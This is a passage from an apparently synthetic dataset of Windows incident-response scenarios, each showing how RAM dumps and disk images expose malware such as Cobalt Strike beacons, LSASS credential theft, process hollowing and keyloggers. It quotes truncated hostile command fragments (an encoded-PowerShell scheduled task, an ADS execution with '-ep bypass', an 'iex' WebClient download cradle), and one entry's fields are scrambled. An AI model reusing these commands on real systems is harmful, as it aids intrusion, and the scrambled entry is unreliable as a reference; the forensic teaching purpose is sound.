- **Vulnerability**: Memory-resident malware (Cobalt)
- **MITRE**: T1055, T1071
- **Impact**: Cobalt beacon → memory dumped → malware exposed
- **Tools**: Magnet RAM Capture, Volatility
- **Scenario**: Volatile memory collected to trace live C2 beacon
- **Attack Steps**: SOC detects active Cobalt Strike beacon on host ENG-WIN01. Network flow shows persistent HTTP POSTs to suspicious domain. EDR confirms anomalous child process spawning from rundll32.exe. Live RAM capture initiated using Magnet RAM Capture. Memory dumped to secure drive. Volatility plugins used: pslist, netscan, malfind, cmdline, and procdump. Memory reveals in-memory shellcode in injected svchost.exe PID. Malicious beacon configuration extracted. Dumped memory preserved, IOC created for beacon pattern, and AV signature updated. Disk imaging also queued to correlate persistence.
- **Detection**: Volatility + netscan + malfind + IOC build
- **Solution**: RAM + process + config extract
- **Tags**: #cobaltstrike #ramforensics #livecapture

## Memory Dump Uncovers Credential Harvester Hidden in WmiPrvSE

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Process injection into WMI process
- **MITRE**: T1003.001, T1055.002
- **Impact**: WMI memory dump reveals injected harvester
- **Tools**: WinPMEM, Volatility, Belkasoft RAM Analyzer
- **Scenario**: WMI service injected with harvesting code
- **Attack Steps**: Endpoint shows signs of credential theft via event logs and LSASS-related EDR alerts. WinPMEM used to capture memory with minimal impact. Dump loaded into Volatility, using psscan and malfind, analyst finds injected shellcode within WmiPrvSE.exe. Dumped memory segment contains Mimikatz-like patterns and cleartext credential strings. Memory-mapped handles reviewed via handles plugin. Belkasoft used in parallel for credential discovery and registry hive snapshots. Alerts raised, user passwords reset, system isolated. IOC rule written for parent-child anomalies with WMI.
- **Detection**: Volatility + credential string recovery
- **Solution**: WinPMEM + Belkasoft + LSASS trace
- **Tags**: #wmiinjection #memorydump #mimikatz

## Live Memory Captured from RDP-Hijacked Server for Forensic Chain

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows Server
- **Vulnerability**: RDP abuse + token theft
- **MITRE**: T1021.001, T1134
- **Impact**: Memory holds proof of session hijack
- **Tools**: FTK Imager (Lite), Volatility, Event Logs
- **Scenario**: RDP session hijack detection triggers capture
- **Attack Steps**: RDP session on RDS-WIN10 hijacked using stolen token; attacker disables logging. Suspicious activity observed in SIEM. Memory dump taken live using FTK Imager Lite with verification hashes enabled. Volatility timeline analysis shows token duplication via winlogon.exe, memory residue of attacker’s commands in cmd.exe shell. netscan confirms active outbound tunnel to unknown IP. Memory reveals attacker payload in compressed format. Dump hashed, archived, and preserved in evidence locker. RDP access logs manually reconstructed via registry keys.
- **Detection**: Dump + netscan + timeline analysis
- **Solution**: FTK + Volatility + shell residue
- **Tags**: #rdphijack #tokenforensics #memtimeline

## RAM Snapshot During DLL Side-Loading into Signed Microsoft Binary

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: DLL side-loading into signed binary
- **MITRE**: T1574.002
- **Impact**: Sideload + dump + volatile memory flag
- **Tools**: Belkasoft, Volatility, DumpIt
- **Scenario**: DLL sideload observed via msbuild.exe
- **Attack Steps**: EDR shows suspicious behavior from msbuild.exe. Memory dump taken via DumpIt during live attack. Volatility dlllist shows side-loaded DLL not matching hash of original. Memory dump confirms custom loader DLL running within trusted Microsoft binary. Malicious code scraped from vadump, injected function chain extracted. malfind flags memory segment with RWX permissions and obfuscated strings. Dump triaged via Belkasoft shows embedded C2 config. YARA rule created for DLL header structure, and binary hash uploaded to threat intel feeds.
- **Detection**: Volatility + Belkasoft + dlllist
- **Solution**: Signed binary abuse + in-memory loader
- **Tags**: #dllsideloading #signedbinary #ramhunt

## Dumping Memory to Identify Persistence via Hidden Scheduled Task

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Scheduled task via corrupted XML
- **MITRE**: T1053.005
- **Impact**: Dump reveals hidden scheduled task trick
- **Tools**: Magnet RAM Capture, Volatility, Autoruns
- **Scenario**: Malicious task persists via schtasks but not in task folder
- **Attack Steps**: Host behaving suspiciously after reboot. Malware hidden via scheduled task not visible in GUI. RAM captured using Magnet tool. Volatility svcscan and timeliner show task running under svchost with custom arguments. In-memory string search exposes command: schtasks /create /tn "Updater" /tr "powershell -EncodedCommand...". Task not visible in task folders due to corrupted manifest trick. Autoruns also reveals registry-based persistence. Memory chain verified, custom parser built for task manifest artifacts.
- **Detection**: Volatility + memory svcscan + encoded cmd
- **Solution**: Autoruns + manifest analysis
- **Tags**: #hiddenschtask #memorytaskhunt #persistence

## Memory Image Captures In-Flight Malware Payload in Fileless Attack

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Fileless PS attack in memory
- **MITRE**: T1059.001, T1027
- **Impact**: Fileless macro → base64 → memory injection
- **Tools**: Volatility, PEStudio, Rekall
- **Scenario**: Powershell-based loader doesn't touch disk
- **Attack Steps**: SOC observes base64 PowerShell run via winword.exe. EDR flags LOLBin pattern. Dump initiated with Rekall. Memory analysis via Volatility uncovers encoded blob injected directly into memory using Invoke-Expression. malfind identifies memory segment with unpacked shellcode. Extracted payload analyzed in PEStudio reveals code to perform keylogging and data exfil via DNS tunnel. Memory timeline confirms execution within 2 seconds of macro activation. Entire in-memory chain preserved, host isolated. Prevention updated with macro restrictions and LOLBin monitoring.
- **Detection**: Volatility + PS decode + DNS exfil
- **Solution**: Rekall + PEStudio + memory extract
- **Tags**: #fileless #psmacro #dnsbeacon

## Evidence Acquisition from RAM to Trace Worm Propagation over SMB

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: In-memory worm propagation
- **MITRE**: T1105, T1021.002
- **Impact**: svchost injection → lateral SMB spread
- **Tools**: DumpIt, Volatility, YARA
- **Scenario**: SMB worm spreads using svchost shellcode
- **Attack Steps**: Worm propagates internally by dropping shellcode into svchost.exe and scanning SMB shares. RAM captured mid-propagation. Volatility psscan identifies multiple suspended processes, with malfind highlighting encoded shellcode. ldrmodules shows hollowed memory regions in system process. Custom YARA signature matches worm variant seen in past campaigns. Extracted memory config shows hardcoded credentials and IP list for lateral movement. IOC list built and pushed to all endpoints. Volatile memory preservation used for attribution and legal evidence.
- **Detection**: Volatility + YARA + IP correlation
- **Solution**: Worm config + mem inject trace
- **Tags**: #smbworm #ramscan #shellcodeforensics

## Belkasoft Image Uncovers Anti-Forensics Code in Memory

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Anti-forensic tools in RAM
- **MITRE**: T1070.001, T1112
- **Impact**: Clear logs + registry tamper → caught in dump
- **Tools**: Belkasoft, Volatility, FTK Imager
- **Scenario**: Tool attempts to wipe logs and tamper registry
- **Attack Steps**: Suspicious activity discovered on financial workstation. Live image taken with Belkasoft, RAM shows process logcleaner.exe with strings pointing to ClearEventLogs() and reg delete. Volatility pslist and cmdline reveal timed scripts executing cleanup jobs every 30 min. Belkasoft highlights usage of Win32 API NtClearAllEventLogs. Event logs partially cleared, but memory snapshot shows execution trace and parameter list. Process mapped back to USB-connected executable. Forensic preservation helps recover intent and attribution.
- **Detection**: Belkasoft + FTK + memory API trace
- **Solution**: Logs + memory + code behavior
- **Tags**: #logtamper #registryclean #memoryproof

## FTK Image Used to Correlate RAM Artifacts with USB Dropper Execution

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Fileless USB dropper + memory beacon
- **MITRE**: T1091, T1059
- **Impact**: USB → dropper → memory → beacon
- **Tools**: FTK Imager, Volatility, USBDeview
- **Scenario**: Dropper runs from USB, leaves no file trace
- **Attack Steps**: User inserts USB, executes dropper which erases itself post-execution. Host becomes beacon node. FTK Imager used to capture full live image. Volatility cmdline shows E:\dropper.exe invoked, while devicetree confirms USB insertion timestamp. Memory scan reveals active C2 channel via powershell.exe. Timeline reconstructed: USB insert → process spawn → in-memory persistence. USB serial matched to internal employee. Alert triggers insider threat protocol. Host isolated, USB blacklisted, security awareness training issued.
- **Detection**: FTK + cmdline + devicetree + net
- **Solution**: RAM + USB trace + insider flag
- **Tags**: #usbattack #filelessusb #ftkimaging

## Capture of Volatile Memory Reveals In-Memory Chrome Extension Hijack

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows (Browser)
- **Vulnerability**: Extension injection in-memory
- **MITRE**: T1176, T1115
- **Impact**: Chrome extension hijack → memory only
- **Tools**: Magnet RAM Capture, Volatility, Chrome Debugger
- **Scenario**: Chrome extension replaced by malicious memory injector
- **Attack Steps**: Chrome behaving unusually, sending unauthorized POSTs. RAM captured live, Volatility plugin chrome parses browser memory. Dump reveals memory-only extension injection that rewrites background.js and manifest.json directly in RAM. Extension bypassed signature checks and auto-loaded. netscan confirms comms to attacker server. Malicious JS function stealCookies() and fetch logic recovered. IOC signatures generated, extension GUID banned org-wide, Chrome enterprise policy hardened.
- **Detection**: Volatility chrome parse + JS recover
- **Solution**: RAM + JS + browser plugin trace
- **Tags**: #chromeinject #browsermemory #cookiesteal

## Memory Dump Captures In-Memory VBS Downloader Triggered via Scheduled Task

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Fileless VBS loader in RAM
- **MITRE**: T1053.005, T1059.005
- **Impact**: Dump reveals memory-only VBS downloader
- **Tools**: Magnet RAM Capture, Volatility, Autoruns
- **Scenario**: Scheduled task launches hidden VBS loader in memory
- **Attack Steps**: Suspicious scheduled task executes VBS that never drops files. Magnet RAM Capture creates live image. Volatility analysis (psscan, malfind, vadinfo) reveals VBS executing via wscript.exe with memory-mapped strings linking to C2. No file artifacts on disk. autoruns confirms persistence via hidden task set to launch on user login. Strings recovered from RAM show encoded download logic. Host quarantined, IOC crafted for task name + memory signature. System-wide scan deployed for similar VBS stagers.
- **Detection**: Volatility + task analysis + strings
- **Solution**: RAM scan + hidden persistence detect
- **Tags**: #vbsloader #raminvestigation #taskinject

## Volatile Memory Dump Reveals Use of LOLBin Curl to Download Reverse Shell

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Curl + rundll32 LOLBin chain
- **MITRE**: T1105, T1218
- **Impact**: Curl abused → reverse shell in memory
- **Tools**: Volatility, FTK Imager, PEStudio
- **Scenario**: Curl.exe abused to download obfuscated payload in-memory
- **Attack Steps**: Unusual outbound connections noted on dev workstation. RAM image captured with FTK Imager. Volatility cmdline plugin reveals curl.exe command fetching executable from malicious domain. netscan confirms TCP connection to known C2 IP. Payload injected directly via rundll32. malfind detects RWX region with shellcode. Memory-dumped binary analyzed via PEStudio—contains reverse shell logic disguised as update checker. Host isolated, memory hashed, and YARA rules written.
- **Detection**: Volatility + netscan + cmdline
- **Solution**: LOLBin pattern + RAM forensics
- **Tags**: #lolbins #curlabuse #memoryartifact

## Disk Image Uncovers Timestamped Persistence Through Registry and Startup Folder

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Dual persistence via Run key + startup
- **MITRE**: T1060, T1547.001
- **Impact**: Registry + startup folder → persist
- **Tools**: FTK Imager, Belkasoft, Autopsy
- **Scenario**: Attacker creates dual persistence via registry + startup folder
- **Attack Steps**: FTK creates full disk image after malware beacon detected. Forensic disk mount via Autopsy reveals binary in startup folder named winservices.exe. Registry analysis with Belkasoft finds key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Timeline shows file dropped 2 mins before registry key set. FTK correlates SHA256 hash with known malware family. Prefetch files reveal repeated execution. Persistence chain verified, IOC extracted, IR playbook triggered for dual-persistence patterns.
- **Detection**: FTK + Belkasoft + timestamp chain
- **Solution**: Disk + registry + startup sync
- **Tags**: #startupfolder #regpersist #disktimeline

## Memory Dump from Cloud VM Exposes Credential Dumping via LSASS Access

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Cloud / Windows
- **Vulnerability**: LSASS dump from cloud workload
- **MITRE**: T1003.001
- **Impact**: Memory = plaintext credentials → reset
- **Tools**: Rekall, Volatility, Belkasoft
- **Scenario**: LSASS accessed in Azure VM for credential dumping
- **Attack Steps**: EDR alert from Azure VM shows process with handle to LSASS. Cloud forensics initiated. Memory dumped via Rekall, loaded into Volatility. pslist, handles, and procdump used to extract and review LSASS memory. Belkasoft RAM analyzer finds multiple plaintext credentials, clear traces of Mimikatz usage. IP address linked to threat actor APT37. Azure snapshot stored with forensic hash, credentials force reset org-wide, memory-based IOC signature deployed.
- **Detection**: Volatility + Rekall + Belkasoft parse
- **Solution**: RAM capture + handle trace
- **Tags**: #cloudlsass #azureram #credentialdump

## RAM Imaging Reveals Hidden Process Hollowing Using Suspended Explorer.exe

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Hollowed process in memory
- **MITRE**: T1055.012
- **Impact**: explorer.exe suspended → injected → active
- **Tools**: DumpIt, Volatility, Process Hacker
- **Scenario**: Suspended explorer.exe hollowed with malicious payload
- **Attack Steps**: Suspicious child process chain triggers dump. Memory captured using DumpIt. Volatility malfind and psscan identify suspended explorer.exe injected with shellcode not matching on-disk binary. Process tree reveals spoofed parent as winlogon.exe. Memory strings indicate download logic to remote IP. Hollowed memory segment dumped and decoded. Suspicious PE headers reveal fake section names and import redirection. IOC pushed to detect suspended hollow patterns across fleet.
- **Detection**: Volatility + PE headers + PID mismatch
- **Solution**: DumpIt + hollow trace + tree audit
- **Tags**: #hollowing #explorerdump #stealthinject

## Disk Image Validates Fileless Malware via NTFS Alternate Data Streams

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: iex`. Memory segment dumped and reviewed, signature created. Hosts scanned org-wide for NTFS stream abuse.
- **Vulnerability**: Windows
- **MITRE**: ADS + PowerShell exec
- **Impact**: T1564.004, T1059.001
- **Tools**: FTK Imager, Autopsy, Volatility
- **Scenario**: Malware hides in ADS, runs via PowerShell
- **Attack Steps**: SIEM logs show encoded PowerShell activity from powershell.exe. Disk image created with FTK. Autopsy scans NTFS volume for hidden streams, detects suspicious executable in readme.txt:secret. Executable never written as normal file. Volatility confirms in-memory execution of file via command line `powershell -ep bypass -c Get-Content .\readme.txt:secret
- **Detection**: ADS fileless loader → in-memory beacon
- **Solution**: NTFS scan + PS decode + RAM match
- **Tags**: FTK + Volatility + command string

## RAM Dump Detects Reflective Loader Injected into MSBuild Pipeline

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: MSBuild + reflective DLL loader
- **MITRE**: T1127.001, T1055
- **Impact**: Reflective DLL inside build process
- **Tools**: Magnet RAM Capture, Volatility, x64dbg
- **Scenario**: MSBuild abused to inject payload via reflective DLL
- **Attack Steps**: Engineering host shows beacon via msbuild.exe. RAM snapshot captured via Magnet RAM Capture. Volatility dlllist, vadinfo, and cmdline reveal injected reflective DLL in memory. PE dumped and loaded into x64dbg for inspection. Contains shellcode section and string obfuscation. Executed inline from XML build file. Memory strings confirm attacker-built script within build pipeline. SOC isolates host, configures build server lockdown, signature created for reflective loader pattern.
- **Detection**: RAM scan + x64dbg analysis
- **Solution**: Magnet + Volatility + x64 trace
- **Tags**: #msbuildinject #reflectiveloader #memoryabuse

## Disk Image Captures Malicious Browser Extension Loaded from AppData

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows (Browser)
- **Vulnerability**: Chrome extension from AppData
- **MITRE**: T1176, T1115
- **Impact**: Chrome + WebSocket = malicious exfil
- **Tools**: FTK Imager, ChromeParser, PEStudio
- **Scenario**: Extension communicates with C2 over WebSocket
- **Attack Steps**: User reports strange Chrome behavior. Disk image acquired with FTK. Forensic mount reveals unrecognized extension in AppData\Local\Google\Chrome\User Data\Default\Extensions\mnh. Files background.js and manifest.json include hardcoded WebSocket IP. ChromeParser decodes contents. Timeline shows extension added post-malicious download event. Prefetch file confirms Chrome invoked with malicious flag. PEStudio checks accompanying EXE that drops extension. IOC created for extension GUID.
- **Detection**: AppData + manifest decode
- **Solution**: FTK + ChromeParser + PEStudio
- **Tags**: #chromeext #websocketc2 #disktrace

## Live Memory Shows Meterpreter Stager Executing via Macro

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Macro → PS → Meterpreter
- **MITRE**: T1059.001, T1027
- **Impact**: Macro → encoded cmd → RAM beacon
- **Tools**: Rekall, Volatility, PEStudio
- **Scenario**: Macro uses encoded PowerShell to launch stager
- **Attack Steps**: Alert: suspicious Word doc opens macro. RAM image via Rekall. Volatility malfind, psscan shows encoded command spawning via powershell.exe and beaconing to remote port 4444. Strings reveal iex(New-Object Net.WebClient...). Meterpreter stager dumped and analyzed in PEStudio — custom obfuscation, staged connect-back. Rekall timeline plugin confirms execution seconds after macro enabled. Document hash extracted, macro stripped, C2 domain blocked.
- **Detection**: RAM + decode + stager dump
- **Solution**: Rekall + PEStudio
- **Tags**: #macrostager #meterpreterram #obfuscation

## Memory Dump Uncovers Encrypted Memory Loader Running as Service

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: XOR-encrypted memory service
- **MITRE**: T1027, T1055
- **Impact**: Encrypted blob → decode → service payload
- **Tools**: Belkasoft, Volatility, x64dbg
- **Scenario**: Service running shellcode from encrypted blob
- **Attack Steps**: High CPU from unknown service on ACCT-WIN05. Memory captured, Volatility shows unknown service under svchost.exe. vadinfo reveals large RWX segment with unrecognized content. Belkasoft deobfuscates memory region, finds XOR-encrypted shellcode. Key extracted from decoded config string. x64dbg steps through decrypted payload, reveals full malware chain including keylogger and C2 logic. Dumped for signature creation. Host isolated, all RWX memory segments scanned org-wide.
- **Detection**: RAM scan + XOR decrypt + x64 analysis
- **Solution**: Belkasoft + svchost memory walk
- **Tags**: #encryptedram #svchostinject #memorydecode

## Volatile Memory Captured to Investigate LSASS Access via Suspicious Handle

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Credential access via unprivileged process
- **MITRE**: T1003.001
- **Impact**: Non-elevated access to LSASS → dump attempt
- **Tools**: Rekall, Volatility, Belkasoft
- **Scenario**: Suspect process gains LSASS handle without elevated rights
- **Attack Steps**: Analyst identifies abnormal LSASS handle access by explorer.exe. RAM dumped with Rekall. Volatility handles, pslist, and malfind show explorer.exe using Windows API OpenProcess() with PID of LSASS. Handle flag reveals PROCESS_QUERY_INFORMATION. No elevated token observed—implies privilege escalation bypass or leaked handle. Dumped memory examined in Belkasoft reveals extraction of cached creds via memory scraping DLL. Sysmon logs correlate injection timestamp. Host isolated, new detection signature applied.
- **Detection**: Volatility handles + Belkasoft strings
- **Solution**: Memory + API abuse + privilege flaw
- **Tags**: #lsassaccess #handleabuse #privbypass

## Memory Imaging Detects Anti-Analysis Sleep Obfuscation in Injected Payload

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Obfuscation via long sleep delays
- **MITRE**: T1497.001
- **Impact**: Sleep + TSC = evade sandbox → caught in RAM
- **Tools**: Magnet RAM Capture, Volatility, x64dbg
- **Scenario**: Sleep obfuscation delays analysis, only visible in RAM
- **Attack Steps**: System shows delayed execution after macro launch. RAM dumped using Magnet tool. Volatility psscan and vadinfo reveal large memory section with no mapped file. Manual inspection shows encrypted shellcode with Sleep(600000) and time-stamp counter routines. Dumped and debugged via x64dbg to reveal in-memory logic obfuscating behavior for 10 mins. Malware avoids detection by waiting before execution. SOC creates memory YARA rule for shellcode header. System flagged for sandbox evasion.
- **Detection**: Dump + delay decode + in-memory debug
- **Solution**: x64dbg + shellcode match
- **Tags**: #sleepevade #timedloader #ramonlycode

## RAM Image Confirms DLL Injection Into Explorer Shell via COM Hijack

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: DLL injection via COM registry hijack
- **MITRE**: T1546.015
- **Impact**: COM hijack → explorer DLL inject
- **Tools**: FTK Imager, Volatility, Autoruns, RegRipper
- **Scenario**: COM hijack triggers DLL load into shell process
- **Attack Steps**: Explorer acting abnormally on login. Full RAM image captured with FTK. Volatility dlllist shows rogue DLL ShellExt64.dll loaded in explorer.exe. malfind flags region with high entropy. Registry hives dumped via RegRipper expose altered CLSID under HKCU\Software\Classes\CLSID\{GUID}\InprocServer32. Autoruns confirms hijack path points to user-controlled folder. Memory scan finds embedded strings linking to exfiltration script. IOC rules created.
- **Detection**: RAM + registry hive + autoruns match
- **Solution**: FTK + RegRipper + Volatility
- **Tags**: #comhijack #explorerdll #registryinject

## Memory Dump Shows Fileless Cobalt Beacon Running Within WerFault.exe

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Fileless Cobalt in error handler
- **MITRE**: T1055, T1071
- **Impact**: WerFault hijacked for memory-only beacon
- **Tools**: Volatility, Belkasoft, PEStudio
- **Scenario**: Cobalt Strike shellcode inside WerFault with no dropped binary
- **Attack Steps**: Suspicious WerFault.exe network activity observed. RAM captured, analyzed with Volatility. pslist, cmdline, and malfind reveal memory region in WerFault with shellcode matching Cobalt beacon pattern. Belkasoft deobfuscates memory block, confirming http-get.uri and sleeptime. No file dropped—entire beacon is in memory. Dumped PE file analyzed in PEStudio confirms in-memory loader stub. IOC includes ParentPID: services.exe, beacon string offsets, RWX segments.
- **Detection**: Memory + shellcode + C2 decode
- **Solution**: Beacon config + process match
- **Tags**: #werfaulthijack #filelesscobalt #rambasedc2

## Disk + Memory Reveal Powershell Reflective Loader via Scheduled Event

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Reflective .NET PowerShell loader
- **MITRE**: T1053.005, T1059.001
- **Impact**: Scheduled → idle event → RAM loader
- **Tools**: FTK Imager, Volatility, Event Logs, Task Scheduler
- **Scenario**: Malicious event triggers hidden PowerShell loader
- **Attack Steps**: Endpoint executes reflective loader during idle via malicious scheduled event. FTK disk image shows .ps1 loader in obscure AppData path. Volatility pslist and cmdline show encoded PowerShell loaded into memory. RAM dump reveals Add-Type block compiling C# inline DLL, creating memory-only stager. Timeline built from scheduled task logs and PowerShell history confirms attack path. Loader string recovered and decoded, signatures updated for scheduled loader templates.
- **Detection**: Disk + mem string decode + log correlation
- **Solution**: FTK + PowerShell + timeline build
- **Tags**: #reflectiveps #scheduledload #memscript

## Memory Image Exposes Cross-Process Injection Into Antivirus Process

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: AV process injection for evasion
- **MITRE**: T1055.002, T1027
- **Impact**: Malware rides inside AV memory
- **Tools**: DumpIt, Volatility, PEStudio
- **Scenario**: Attacker injects into AV service to evade EDR
- **Attack Steps**: Alert from internal AV scanner fails to load definitions. DumpIt captures RAM snapshot. Volatility pslist shows injection into MsMpEng.exe. malfind flags RWX region with shellcode tied to backconnect routine. PEStudio identifies process as malformed PE with renamed headers, executed inline. Attacker avoided detection by riding inside AV container. RAM dump reveals C2 config and mutex AVHijack_Mutex. SOC blacklists injection pattern and disables affected signature temporarily.
- **Detection**: RAM dump + shellcode + PE tool
- **Solution**: DumpIt + Volatility + PEStudio
- **Tags**: #avbypass #crossinject #edrevasion

## RAM Dump Highlights Covert DNS Beacon Hidden in svchost Memory

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: DNS C2 over TXT → in-memory
- **MITRE**: T1071.004, T1055
- **Impact**: svchost → DNS exfil → memory-only
- **Tools**: Magnet RAM Capture, Volatility, Wireshark
- **Scenario**: svchost.exe carries DNS covert channel payload
- **Attack Steps**: EDR flags DNS overuse on client machine. Magnet captures memory. Volatility plugins netscan, malfind, and strings used to analyze svchost.exe. Memory reveals injected binary running covert C2 using DNS TXT records. Wireshark confirms matching DNS queries. Payload includes encoded C2 and encryption key. Beacon only exists in RAM—never written to disk. Memory config dumped, alert rules applied, detection signature created based on encoded query length and timing interval.
- **Detection**: Memory dump + traffic decode
- **Solution**: RAM beacon string + DNS pattern
- **Tags**: #dnsexfil #svchostinject #memoryc2

## RAM Investigation Finds Embedded Golang Binary Running as Packed Process

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: In-memory Golang implant
- **MITRE**: T1027, T1204
- **Impact**: Packed Go binary → in memory only
- **Tools**: Rekall, Volatility, x64dbg
- **Scenario**: Golang malware runs entirely from memory with custom packing
- **Attack Steps**: Host performance degrades. Rekall memory capture initiated. Volatility finds process with large anonymous memory section. malfind shows PE header pattern in memory not mapped to file. x64dbg confirms Golang-based binary with non-standard section headers. Memory segment contains hardcoded botnet IPs, encoded keylogger logic. Unpacked in-memory using Volatility plugin, dumped PE fed into detection sandbox. IOC developed for memory-based Golang implants.
- **Detection**: RAM dump + section decode + sandbox
- **Solution**: x64dbg + Rekall + memory PE dump
- **Tags**: #golangmalware #inmemorygo #packedbinary

## RAM Capture Reveals Hidden IRC Bot in Powershell Process Tree

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: IRC bot in memory via PS
- **MITRE**: T1071.001, T1059
- **Impact**: Powershell IRC handler → memory only
- **Tools**: Volatility, PEStudio, Wireshark
- **Scenario**: IRC-based malware masquerades in PS process
- **Attack Steps**: Unusual traffic to IRC port (6667) detected. RAM captured, analyzed in Volatility. Powershell process includes injected memory region with IRC command handlers. psscan shows orphaned PID tree. Wireshark confirms IRC handshake with attacker server. PEStudio extracts shellcode from memory—contains JOIN, PRIVMSG strings and hardcoded C2 channel. Entire logic only lives in RAM. Signature built based on PS tree + memory string pattern.
- **Detection**: Memory + network + bot signature
- **Solution**: Volatility + PEStudio + port match
- **Tags**: #ircbot #powershellinject #ramcommand

## Dump of Memory From Developer Host Shows Embedded Python Loader

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Embedded Python in memory
- **MITRE**: T1059.006, T1027
- **Impact**: Python loader → memory-only run
- **Tools**: DumpIt, Volatility, PEStudio
- **Scenario**: Python malware embedded in memory via py2exe wrapper
- **Attack Steps**: Dev system compromised via malicious Python app. DumpIt used to capture memory. Volatility finds temp.exe process with embedded Python runtime (py2exe). Strings reveal import socket, os, and remote exec logic. PEStudio analysis confirms bundled Python interpreter + base64 loader script. Execution never writes script to disk. Memory analysis recovers decrypted code, confirms exfiltration via HTTP POST. Threat hunting deployed for py2exe process indicators.
- **Detection**: PEStudio + strings + decrypt
- **Solution**: DumpIt + py2exe analysis
- **Tags**: #pythoninjection #py2exe #ramcode

## Live RAM Dump Uncovers Keylogging Routine Injected in Explorer Thread

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Memory keylogger in explorer
- **MITRE**: T1056.001
- **Impact**: DLL injected via thread into explorer
- **Tools**: Magnet RAM Capture, Volatility, x64dbg, PEStudio
- **Scenario**: Suspicious keystroke logging DLL injected into explorer.exe via remote thread
- **Attack Steps**: Endpoint suspected of keylogging. RAM dumped using Magnet tool. Volatility psscan confirms a remote thread in explorer.exe not matching its memory map. malfind shows RWX memory segment pointing to shellcode starting with keyboard hook API calls (SetWindowsHookEx). Memory is dumped. x64dbg and PEStudio confirm the binary reads raw keyboard input and buffers keystrokes to memory. IOC includes function calls to GetAsyncKeyState and signature string "KLOG_START". SOC pushes YARA to detect these hooks across fleet.
- **Detection**: Volatility + thread scan + PE decode
- **Solution**: Dump remote thread, hook detection
- **Tags**: #keylogging #explorermemory #threadinject

## RAM Shows Encoded Binary Run via Rundll32 with Control over Entry Point

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Registry loader via rundll32
- **MITRE**: T1218.011, T1112
- **Impact**: Rundll32 reads + injects payload from registry
- **Tools**: Rekall, Volatility, Autoruns
- **Scenario**: Attacker abuses Rundll32 to run encoded blob from registry
- **Attack Steps**: Rundll32 process shows high CPU. RAM dumped and analyzed with Volatility. pslist, cmdline indicate /shell32.dll,Control_RunDLL with suspicious argument. Registry hives show base64-encoded payload under HKCU\Software key. Dumped memory segment reveals executable blob decoded and invoked through VirtualAlloc + CreateThread. DLL entry function never matches any legitimate signature. Autoruns confirms registry persistence. IOC includes key path and rundll command string.
- **Detection**: Memory + registry decode + thread trace
- **Solution**: Autoruns + registry + API combo
- **Tags**: #rundll32inject #regblob #encodedbinary

## Memory Analysis Identifies .NET Assembly Reflectively Loaded via AppDomain

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Reflectively loaded .NET DLL
- **MITRE**: T1218.009, T1036
- **Impact**: In-memory .NET code via Assembly.Load
- **Tools**: FTK Imager, Volatility, dnSpy
- **Scenario**: Attacker loads .NET DLL into memory without writing to disk
- **Attack Steps**: EDR flags long-running .NET process. RAM imaged with FTK. Volatility plugins detect AppDomainManager-style execution with Assembly.Load(byte[]). Dumped memory module contains encrypted .NET assembly. Decrypted in dnSpy—malware includes screen capture, keystroke logging, and credential theft modules. No assembly file present on disk. IOC built from AppDomain behavior, CLR memory markers, and specific .NET class names.
- **Detection**: Volatility + .NET runtime trace
- **Solution**: dnSpy + CLR signature + dump
- **Tags**: #dotnetreflective #clrload #nodiskdll

## RAM Dump Shows Encoded PowerShell Used for Clipboard Hijacking

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
- **Vulnerability**: Clipboard hijack via memory-only PS
- **MITRE**: T1115, T1059.001
- **Impact**: PowerShell memory stream hijacks clipboard
- **Tools**: DumpIt, Volatility, PEStudio
- **Scenario**: Clipboard monitoring via encoded PowerShell injected in memory
- **Attack Steps**: Memory dump from suspicious dev host reveals PowerShell process with iex + base64 encoded logic. Volatility cmdline, malfind, and strings isolate PowerShell decoding buffer. Decoded command logs clipboard content to temp file, sends via HTTP POST to external IP. Dumped PS logic analyzed with PEStudio shows Windows API calls to OpenClipboard, GetClipboardData. Host isolated, IOC includes encoded command structure + outbound pattern.
- **Detection**: Memory + encoded decode + API monitor
